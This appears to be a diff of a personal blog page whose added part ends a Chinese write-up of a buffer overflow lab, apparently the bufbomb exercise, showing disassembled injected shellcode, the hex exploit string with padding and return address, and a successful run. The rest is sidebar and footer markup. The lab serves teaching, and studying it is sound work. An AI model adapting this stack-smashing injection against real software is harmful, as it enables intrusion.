-            </aside>
-        </div>
-    </div>
+00000000 &lt;.text&gt;:
+   0:   b8 f4 4a b2 3a          mov    $0x3ab24af4,%eax
+   5:   68 be 8d 04 08          push   $0x8048dbe
+   a:   bd 10 37 68 55          mov    $0x55683710,%ebp
+   f:   c3                      ret
+</pre></div>
+
+
+<p>最后得到我们的level4.txt为：</p>
+<div class="highlight"><pre><span></span>b8 f4 4a b2 3a 68 be 8d 04 08 bd 10 37 68 55 c3 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 b8 36 68 55
+</pre></div>
+
+
+<p>运行：</p>
+<div class="highlight"><pre><span></span>cat level3.txt  | ./hex2raw.py | ./bufbomb -u yj
+Userid: yj
+Cookie: 0x3ab24af4
+Type string:Boom!: getbuf returned 0x3ab24af4
+VALID
+NICE JOB!
+</pre></div>
+
+
+<p>成功完成！</p></div>
+    <footer>
+<p class="meta">
+  <span class="byline author vcard">
+    Posted by <span class="fn">
+        jin
+    </span>
+  </span>
+<time datetime="2016-02-19T00:00:00+08:00" pubdate>Fri 19 February 2016</time>  <span class="categories">
+    <a class='category' href='/category/cc.html'>c&c++</a>
+  </span>
+  <span class="categories">
+    <a class="category" href="/tag/buffer-overflow-attack.html">buffer overflow attack</a>,    <a class="category" href="/tag/security.html">security</a>,    <a class="category" href="/tag/hack.html">hack</a>,    <a class="category" href="/tag/x86.html">x86</a>,    <a class="category" href="/tag/stack.html">stack</a>  </span>
+</p><div class="sharing">
+</div>    </footer>
+  </article>
+
 </div>
-<footer>
-   <div class="container">
-      <hr>
-      <div class="row">
-         <div class="col-xs-10">&copy; 2016 Jin
-            &middot; Powered by <a href="https://github.com/DandyDev/pelican-bootstrap3" target="_blank">pelican-bootstrap3</a>,
-            <a href="http://docs.getpelican.com/" target="_blank">Pelican</a>,
-            <a href="http://getbootstrap.com" target="_blank">Bootstrap</a>         </div>
-         <div class="col-xs-2"><p class="pull-right"><i class="fa fa-arrow-up"></i> <a href="#">Back to top</a></p></div>
-      </div>
-   </div>
-</footer>
-<script src="http://yangjin-unique.github.io/theme/js/jquery.min.js"></script>
+<aside class="sidebar">
+  <section>
+    <h1>Recent Posts</h1>
+    <ul id="recent_posts">
+      <li class="post">
+          <a href="/buffer-overflow-attackshi-yan.html">Buffer Overflow Attack实验</a>
+      </li>
+      <li class="post">
+          <a href="/makefilehan-shu.html">Makefile函数</a>
+      </li>
+      <li class="post">
+          <a href="/li-yong-debugfsdiao-shi-linux-kernel.html">利用Debugfs调试linux kernel</a>
+      </li>
+      <li class="post">
+          <a href="/ru-he-zai-linuxnei-he-mo-kuai-zhong-jia-ru-netlinktong-xin-jie-kou.html">如何在linux内核模块中加入netlink通信接口</a>
+      </li>
+      <li class="post">
+          <a href="/googles-python-class.html">Google's Python Class</a>
+      </li>
+    </ul>
+  </section>
+  <section>
+      
+    <h1>Categories</h1>
+    <ul id="recent_posts">
+        <li><a href="/category/cc.html">c&c++</a></li>
+        <li><a href="/category/linux.html">linux</a></li>
+        <li><a href="/category/os.html">os</a></li>
+        <li><a href="/category/python.html">python</a></li>
+        <li><a href="/category/tools.html">tools</a></li>
+    </ul>
+  </section>
+ 
 
-<!-- Include all compiled plugins (below), or include individual files as needed -->
-<script src="http://yangjin-unique.github.io/theme/js/bootstrap.min.js"></script>
+  <section>
+  <h1>Tags</h1>
+    <a href="/tag/kernel.html">kernel</a>,    <a href="/tag/user-mode.html">user mode</a>,    <a href="/tag/page-directory.html">page directory</a>,    <a href="/tag/ipc.html">IPC</a>,    <a href="/tag/syscall.html">Syscall</a>,    <a href="/tag/elf.html">elf</a>,    <a href="/tag/hack.html">hack</a>,    <a href="/tag/trap.html">trap</a>,    <a href="/tag/header.html">header</a>,    <a href="/tag/gdb.html">gdb</a>,    <a href="/tag/jos.html">JOS</a>,    <a href="/tag/linux.html">linux</a>,    <a href="/tag/page-table.html">page table</a>,    <a href="/tag/qemu.html">qemu</a>,    <a href="/tag/const.html">const</a>,    <a href="/tag/bios.html">BIOS</a>,    <a href="/tag/debug.html">debug</a>,    <a href="/tag/makefile.html">Makefile</a>,    <a href="/tag/spinlock.html">spinlock</a>,    <a href="/tag/trapframe.html">TrapFrame</a>,    <a href="/tag/multi-processor.html">Multi-processor</a>,    <a href="/tag/task-swtich.html">task swtich</a>,    <a href="/tag/ostinato.html">ostinato</a>,    <a href="/tag/linux-kernel.html">linux kernel</a>,    <a href="/tag/c-c-gcc-wshadow-block-scope.html">C C++ gcc Wshadow block scope</a>,    <a href="/tag/linker.html">linker</a>,    <a href="/tag/pelican-blog-python-virtualenv-githubio.html">pelican blog python virtualenv githubio</a>,    <a href="/tag/x86.html">x86</a>,    <a href="/tag/debugfs.html">debugfs</a>,    <a href="/tag/python.html">python</a>,    <a href="/tag/interrupts.html">interrupts</a>,    <a href="/tag/c.html">C</a>,    <a href="/tag/traffic-generator-analyzer.html">traffic generator analyzer</a>,    <a href="/tag/linelear-address.html">linelear address</a>,    <a href="/tag/stab.html">stab</a>,    <a href="/tag/address-translation.html">address translation</a>,    <a href="/tag/interrupt.html">interrupt</a>,    <a href="/tag/copy-on-write.html">Copy-on-Write</a>,    <a href="/tag/translation.html">translation</a>,    <a href="/tag/bootloader.html">bootloader</a>,    <a href="/tag/stack.html">stack</a>,    <a href="/tag/traps.html">traps</a>,    <a href="/tag/netlink.html">netlink</a>,    <a href="/tag/qt.html">qt</a>,    <a href="/tag/entrys.html">entry.S</a>,    <a href="/tag/os.html">os</a>,    <a href="/tag/multi-process.html">multi-process</a>,    <a href="/tag/page.html">page</a>,    <a href="/tag/logical-address.html">logical address</a>,    <a href="/tag/fork.html">fork</a>,    <a href="/tag/kernel-mode.html">kernel mode</a>,    <a href="/tag/exceptions.html">exceptions</a>,    <a href="/tag/physical-memory-management.html">physical memory management</a>,    <a href="/tag/security.html">security</a>,    <a href="/tag/buffer-overflow-attack.html">buffer overflow attack</a>,    <a href="/tag/tast-state.html">tast state</a>,    <a href="/tag/linux-glibc-malloc-ptmalloc.html">linux glibc malloc ptmalloc</a>  </section>
 
-<!-- Enable responsive features in IE8 with Respond.js (https://github.com/scottjehl/Respond) -->
-<script src="http://yangjin-unique.github.io/theme/js/respond.min.js"></script>
 
-    <!-- Disqus -->
-    <script type="text/javascript">
-        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
-        var disqus_shortname = 'yangjin-unique'; // required: replace example with your forum shortname
+    <section>
+        <h1>Blogroll</h1>
+        <ul>
+            <li><a href="http://getpelican.com/" target="_blank">Pelican</a></li>
+            <li><a href="http://lxr.free-electrons.com" target="_blank">Online Linux Kernel Source Code</a></li>
+            <li><a href="http://coolshell.cn" target="_blank">酷壳CoolShell</a></li>
+        </ul>
+    </section>
 
-        /* * * DON'T EDIT BELOW THIS LINE * * */
-        (function () {
-            var s = document.createElement('script');
-            s.async = true;
-            s.type = 'text/javascript';
-            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
-            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
-        }());
-    </script>
-    <!-- End Disqus Code -->
-
+</aside>    </div>
+  </div>
+  <footer role="contentinfo"><p>
+    Copyright &copy;  2014&ndash;2016  Jin &mdash;
+  <span class="credit">Powered by <a href="http://getpelican.com">Pelican</a></span>
+</p></footer>
+  <script src="/theme/js/modernizr-2.0.js"></script>
+  <script src="/theme/js/ender.js"></script>
+  <script src="/theme/js/octopress.js" type="text/javascript"></script>
+  <script type="text/javascript">
+    var disqus_shortname = 'yangjin-unique';
+    var disqus_identifier = '/buffer-overflow-attackshi-yan.html';
+    var disqus_url = '/buffer-overflow-attackshi-yan.html';
+    var disqus_title = 'Buffer Overflow Attack实验';
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = "//" + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+     })();
+  </script>
 </body>
 </html>
